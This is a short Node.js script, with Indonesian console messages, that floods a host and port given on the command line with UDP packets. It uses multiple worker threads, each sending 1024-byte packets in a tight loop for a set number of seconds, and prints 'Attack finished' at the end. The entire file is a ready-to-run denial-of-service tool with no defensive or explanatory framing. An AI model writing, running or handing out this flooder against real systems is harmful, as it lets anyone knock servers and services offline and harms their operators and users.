const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

if (isMainThread) {
    if (process.argv.length !== 6) {
        console.log(`Usage: node ${process.argv[1]} <host> <port> <time> <thread>`);
        process.exit(1);
    }

    const host = process.argv[2];
    const port = parseInt(process.argv[3]);
    const time = parseInt(process.argv[4]);
    const thread = parseInt(process.argv[5]);

    console.log(`Mengirim paket UDP ke ${host}:${port} selama ${time} detik dengan ${thread} thread...\n`);

    for (let i = 0; i < thread; i++) {
        new Worker(__filename, { workerData: { host, port } });
    }

    setTimeout(() => {
        console.log('Attack finished');
        process.exit(0);
    }, time * 1000);

} else {
    const { host, port } = workerData;
    const socket = dgram.createSocket('udp4');
    const packet = Buffer.alloc(1024, 'A');

    function sendPacket() {
        socket.send(packet, 0, packet.length, port, host, (err) => {
            if (err) console.error(err);
            setImmediate(sendPacket);
        });
    }

    sendPacket();
}
